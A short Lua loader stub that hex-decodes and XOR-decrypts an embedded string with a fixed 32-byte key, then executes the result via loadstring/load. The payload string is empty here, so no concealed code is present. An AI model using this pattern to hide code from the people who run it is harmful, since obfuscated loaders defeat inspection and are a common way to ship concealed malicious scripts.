local k={8,50,241,212,175,223,38,13,31,57,232,155,135,83,67,205,188,29,183,54,245,59,192,227,166,84,74,141,175,252,40,136}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
